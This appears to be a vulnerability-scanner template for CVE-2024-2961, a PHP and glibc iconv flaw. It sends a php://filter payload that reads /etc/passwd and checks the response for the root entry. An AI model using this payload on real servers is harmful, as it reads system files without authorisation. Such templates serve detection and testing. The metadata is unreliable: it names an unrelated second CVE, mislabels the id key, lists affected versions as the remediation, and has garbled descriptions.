hid: CVE-2024-2961

info:
  name: PHP File Read to Remote Code Execution Through GNU C Library Iconv => CVE-2020-1957
  author: Kim Dongyoung (Kairos-hk), bolkv, n0ming, RoughBoy0723
  severity: High
  description: |
    If your application has an arbitrary file read vulnerability by allowing a buffer overflow, remote May lead to code execution.
  impact: |
    Gain unauthorized access or random access from your PHP application This can be exploited to execute code.
  remediation: |
    GNU C Library versions 2.39 and older.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-2961
    - https://github.com/vulhub/vulhub/tree/master/php/CVE-2024-2961
  classification:
    cvss-metrics: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H
    cvss-score: 7.3
    cve-id: CVE-2024-2961
  tags: cve,cve2024, php, iconv, glibc


requests:
  - method: POST
    path:
      - "{{BaseURL}}"
    body: "file=php://filter/read=convert.iconv.UTF-8/ISO-2022-CN-EXT/resource=/etc/passwd"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: word
        words:
          - "root:x:0:0"
